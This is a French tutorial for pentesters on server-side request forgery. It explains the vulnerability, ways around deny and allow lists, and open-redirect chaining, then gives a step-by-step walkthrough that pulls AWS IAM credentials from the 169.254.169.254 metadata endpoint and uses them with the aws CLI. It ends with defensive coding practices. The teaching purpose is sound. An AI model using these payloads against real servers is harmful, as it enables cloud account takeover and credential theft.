# SSRF
## 🔍 Qu’est-ce qu’un SSRF ?  

> **SSRF (Server-Side Request Forgery)** est une vulnérabilité de sécurité web qui permet à un attaquant de **forcer un serveur backend à effectuer des requêtes HTTP vers des destinations arbitraires**, souvent **internes** au réseau de l’application, que le client (navigateur) ne pourrait pas atteindre directement.

Contrairement au **CSRF** (Cross-Site Request Forgery), qui exploite la session d’un utilisateur *côté client*, le **SSRF** exploite la capacité du *serveur lui-même* à faire des requêtes réseau — souvent via des fonctionnalités comme :
- Téléchargement d’images distantes
- Intégration de webhooks
- Fetching de contenu externe (RSS, API, etc.)
- Génération de rapports ou PDF à partir d’URL

---

## 🧠 Analogie intuitive

Imaginez un **robot télécommandé** dans un entrepôt sécurisé. Ce robot peut aller chercher des colis n’importe où dans l’entrepôt, y compris dans des zones réservées (ex : coffre-fort, serveurs internes).  
Vous, en tant qu’extérieur, ne pouvez pas entrer. Mais si vous arrivez à **tromper le système de commande** en disant : *« Va chercher le colis à l’adresse 127.0.0.1:8080/admin »*, le robot obéit… et vous rapporte (ou agit sur) des données sensibles.

C’est exactement ce que fait un SSRF : **vous abusez d’un service légitime du serveur pour qu’il devienne votre "proxy malveillant" vers l’intérieur**.

---

## 🎯 Où trouver un SSRF ? (Vecteurs d’entrée)

Les applications vulnérables exposent souvent des **paramètres contrôlés par l’utilisateur** qui sont utilisés **directement dans une requête HTTP côté serveur**. Voici les 4 cas typiques :

### 1. **URL complète dans un paramètre d’URL**
```http
GET /fetch?url=https://example.com/image.jpg HTTP/1.1
```
→ Le serveur fait `GET https://example.com/image.jpg` et renvoie le contenu.

### 2. **Champ caché dans un formulaire**
```html
<input type="hidden" name="avatar_url" value="https://attacker.com/malicious.jpg">
```
→ Lors de la soumission, le backend télécharge cette image.

### 3. **Hostname partiel**
```http
POST /check-status
Host: target.com
Content-Type: application/json

{"host": "internal-api"}
```
→ Le serveur fait `http://internal-api/status`.

### 4. **Chemin relatif uniquement**
```http
GET /view?path=/etc/passwd
```
→ Parfois, le backend construit une URL comme `file:///etc/passwd` → **SSRF + LFI** !

> ⚠️ **Attention** : même si seul le chemin est fourni, certaines bibliothèques (comme `requests` en Python ou `HttpClient` en Java) peuvent interpréter des schémas comme `file://`, `gopher://`, `dict://`, etc.

---

## 👁️‍🗨️ Types de SSRF

### 1. **SSRF classique (non aveugle)**
- La réponse de la requête interne est **renvoyée dans la page web**.
- Exemple : vous demandez `?url=http://169.254.169.254/latest/meta-data/` → vous voyez les métadonnées AWS.

### 2. **SSRF aveugle (Blind SSRF)**
- Aucune donnée n’est retournée.
- Mais **la requête a bien été faite**.
- Pour confirmer l’exploitation, vous devez utiliser un **service externe** :
  - [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
  - [RequestBin](https://requestbin.com/)
  - Votre propre serveur (`nc -lvnp 80` ou `python3 -m http.server 80`)



---

## 💥 Impact d’un SSRF réussi

Un SSRF bien exploité peut mener à :

| Impact | Explication |
|-------|-------------|
| **Accès à services internes** | Redis, Memcached, Elasticsearch, Docker API, etc. |
| **Lecture de fichiers locaux** | Via `file:///etc/passwd` (si le parser le permet) |
| **Exécution de commandes** | Si un service interne (ex : Redis) accepte des commandes non authentifiées |
| **Vol de métadonnées cloud** | AWS/Azure/GCP exposent des endpoints comme `169.254.169.254` |
| **Pivot dans le réseau interne** | Le serveur devient un relais pour scanner d’autres machines |
| **Contournement d’authentification** | Accès à `/admin` depuis localhost (IP whitelist) |

> 🌩️ **Cas réel célèbre** : En 2018, un SSRF dans **Shopify** a permis d’accéder aux métadonnées AWS → vol de clés IAM → compromission complète.

---

## 🛡️ Contournement des défenses courantes

Les développeurs essaient souvent de se protéger. Voici comment on les contourne.

---

### 🔒 1. **Liste noire (Deny List)**

Le code refuse certaines chaînes :
```python
if "localhost" in url or "127.0.0.1" in url:
    return "Forbidden"
```

#### 🕳️ Bypass : **Obfuscation d’IP/hostname**

| Objet ciblé | Variantes exploitables |
|------------|------------------------|
| `127.0.0.1` | `127.1`, `0`, `0.0.0.0`, `2130706433` (décimal), `017700000001` (octal) |
| `localhost` | `localtest.me`, `lvh.me`, `127.0.0.1.nip.io`, `spoofed@127.0.0.1` |
| `169.254.169.254` (AWS) | `169.254.169.254.nip.io`, ou DNS personnalisé pointant vers cette IP |

> 💡 **Technique avancée** : Utilisez `http://0x7f000001/` (hexadécimal) ou `http://2130706433/`.

---

### ✅ 2. **Liste blanche (Allow List)**

Le code n’accepte que certains domaines :
```python
if not url.startswith("https://api.target.com/"):
    return "Invalid domain"
```

#### 🕳️ Bypass : **Sous-domaine malveillant**

Créez un domaine comme :
```
https://api.target.com.attacker.com/
```
→ Si la vérification est naïve (`startswith`), elle passe.

Mais mieux encore : **Open Redirect** (voir ci-dessous).

---

### 🔄 3. **Open Redirect comme proxy**

Supposons que le site ait une faille **Open Redirect** :
```
https://target.com/redirect?url=https://evil.com
```

Et que le SSRF n’accepte que les URLs commençant par `https://target.com/`.

Alors, vous envoyez :
```
?url=https://target.com/redirect?url=http://169.254.169.254
```

→ Le serveur :
1. Accepte l’URL (elle commence par `target.com`)
2. Fait une requête vers `/redirect`
3. Le serveur redirige **internement** vers `169.254.169.254`
4. Résultat : **vous avez contourné la whitelist !**

> ✅ C’est une **combinaison de vulnérabilités** : Open Redirect + SSRF = accès à l’interne.

---

## 🧪 Exemple d’exploitation réelle (AWS)

### Étape 1 : Détecter le SSRF
```http
GET /load-image?url=http://BURP-COLLABORATOR-ID.burpcollaborator.net
```
→ Vous recevez une requête → SSRF confirmé.

### Étape 2 : Cibler les métadonnées AWS
```http
GET /load-image?url=http://169.254.169.254/latest/meta-data/
```

### Étape 3 : Extraire les credentials IAM
```http
GET /load-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
→ Retourne un rôle, ex : `my-ec2-role`

Puis :
```http
GET /load-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role
```
→ Vous obtenez :
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

### Étape 4 : Utiliser les credentials
```bash
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key ...
aws configure set aws_session_token ...
aws s3 ls
```
→ Accès complet au compte AWS.

---

## 🛠️ Outils & techniques pour tester

| Outil | Usage |
|------|-------|
| **Burp Suite** | Repeater + Collaborator pour tester et confirmer |
| **ffuf / gobuster** | Fuzzing d’endpoints internes (`192.168.0.1`, `10.0.0.1`, etc.) |
| **curl / wget** | Tester localement les payloads |
| **Exegol** | Environnement prêt avec `nmap`, `awscli`, `jq`, etc. |
| **DNS rebinding** | Contourner les vérifications de nom de domaine (avancé) |

---

## 📜 Bonnes pratiques de développement (à connaître pour les audits)

Pour **éviter le SSRF**, les devs doivent :

1. **Ne jamais utiliser d’URL utilisateur directement**.
2. **Utiliser une allowlist stricte** (pas de regex approximatives).
3. **Désactiver les schémas dangereux** : `file://`, `gopher://`, `dict://`, etc.
4. **Isoler les fonctions de fetching** dans un sandbox réseau restreint.
5. **Désactiver les redirections automatiques** dans les clients HTTP.
6. **Valider les IPs résolues** (pas seulement le hostname fourni).

> 📌 En tant que pentester, vous devez **vérifier toutes ces couches**.

